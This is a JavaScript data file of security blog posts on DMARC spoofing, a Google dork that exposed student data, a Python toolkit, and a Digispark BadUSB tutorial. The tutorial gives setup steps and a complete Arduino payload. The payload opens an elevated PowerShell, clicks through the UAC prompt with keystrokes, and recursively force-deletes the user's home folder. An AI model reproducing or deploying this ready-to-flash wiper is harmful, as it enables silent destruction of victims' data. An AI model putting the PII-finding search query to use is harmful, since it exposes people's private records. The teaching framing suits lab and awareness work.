export const blogs = [
  {
    id: "dmarc-email-spoofing",
    title: "DMARC Misconfiguration & Email Spoofing",
    description:
      "How a misconfigured DMARC policy can allow attackers to spoof domain emails.",
    date: "Feb 2026",
    content: `
During a security assessment I identified a misconfigured DMARC policy.

Because the policy was not enforced (p=none), attackers could send spoofed
emails appearing to originate from the domain.

Impact:
• Email spoofing
• Phishing attacks

Mitigation:
• Configure DMARC policy to p=reject
• Enforce SPF and DKIM validation
`
  },
  {
    id: "google-dorking-pii",
    title: "PII Exposure using Google Dorking",
    description:
      "How OSINT techniques revealed sensitive student data indexed in search engines.",
    date: "Jan 2026",
    content: `
Using Google dorking techniques I discovered publicly indexed
documents containing student data.

Example query:
site:university.edu filetype:pdf "student id"

Impact:
• Exposure of personally identifiable information

Responsible disclosure was made to the university IT team.
`
  },
  {
    id: "open-cobra-toolkit",
    title: "Building Open Cobra Cybersecurity Toolkit",
    description:
      "Designing a Python based toolkit for vulnerability scanning and automation.",
    date: "Dec 2025",
    content: `
Open Cobra is an all-in-one cybersecurity toolkit written in Python.

Modules:
• Network scanning
• Vulnerability analysis
• Automated reporting
• Security logging

Goal:
Provide a modular toolkit for penetration testing workflows.
`
  },
  {
  id: "digispark-attiny85-cybersecurity",
  title: "Digispark ATtiny85: Tiny USB Device Used in Cybersecurity Labs",
  description:
    "How the Digispark ATtiny85 works, how to configure Arduino IDE, and how it is used in cybersecurity labs for HID attacks and demonstrations.",
  date: "Mar 2026",
  content: `
The Digispark ATtiny85 is a small USB development board based on the ATtiny85 microcontroller.

Despite its tiny size, it is extremely powerful and widely used in cybersecurity labs, red-team exercises, and ethical hacking workshops.

It can emulate a USB keyboard (HID device) and automatically execute commands on a computer when plugged in.

Image:

<img src="https://i.ibb.co/DgRZ4xQX/Screenshot-2026-03-06-00-42-50-removebg-preview.png" width="250"/>

Buy Digispark ATtiny85:
https://www.amazon.in/Robodo-Electronics-ATTINY85V2-Digispark-Development/dp/B07B8SS1VQ

----------------------------------------------------

Why Digispark is Popular in Cybersecurity

• USB HID keyboard emulation  
• Extremely small device  
• Very cheap and accessible  
• Executes automated commands instantly  

Because computers trust USB keyboards, the device can automatically type commands once plugged in.

This concept is commonly called BadUSB or HID attacks.

----------------------------------------------------

Setting up Arduino IDE for Digispark

Step 1 — Install Arduino IDE  
https://www.arduino.cc/en/software

Step 2 — Add Board URL

Open:

File → Preferences

Add this URL to Additional Board Manager URLs

http://digistump.com/package_digistump_index.json

----------------------------------------------------

Step 3 — Install Digispark Board

Tools → Board → Boards Manager

Search for:

Digistump AVR Boards

Install it.

----------------------------------------------------

Step 4 — Select Board

Tools → Board → Digispark (Default 16.5mhz)

----------------------------------------------------

Step 5 — Upload Code

Unlike normal Arduino boards:

1. Click Upload  
2. Arduino IDE will say "Plug in your Digispark now..."
3. Insert the Digispark  

The code will upload automatically.

----------------------------------------------------

Example HID Payload

#include "DigiKeyboard.h"

void setup() {

  DigiKeyboard.delay(3000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  DigiKeyboard.print("notepad");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(500);

  DigiKeyboard.println("Your system is vulnerable to HID attacks!");
}

void loop() {}

----------------------------------------------------

Cybersecurity Projects Using Digispark

1. USB Rubber Ducky style payloads  
2. WiFi password extraction lab  
3. Reverse shell demonstrations  
4. Fake update screen (social engineering demo)  
5. Security awareness training  

----------------------------------------------------

Destructive Payload Demonstration (Educational Only)

⚠️ WARNING  
This demonstration shows how HID devices could execute destructive commands.  
Only test this inside a lab environment or on a machine you own.

Example Arduino Code:

#include "DigiKeyboard.h"

void setup() {}

void loop() {

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // Open Run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Open PowerShell
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);

  DigiKeyboard.delay(2000);

  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(1000);

  // Destructive command demonstration
  DigiKeyboard.print("Remove-Item -Path $HOME\\\\* -Recurse -Force -ErrorAction SilentlyContinue");

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for(;;){}
}

----------------------------------------------------

Security Lesson

Devices like Digispark demonstrate an important rule in cybersecurity:

Physical access = total compromise

Organizations must implement:

• USB device restrictions  
• Endpoint protection policies  
• Physical security controls
`
}
];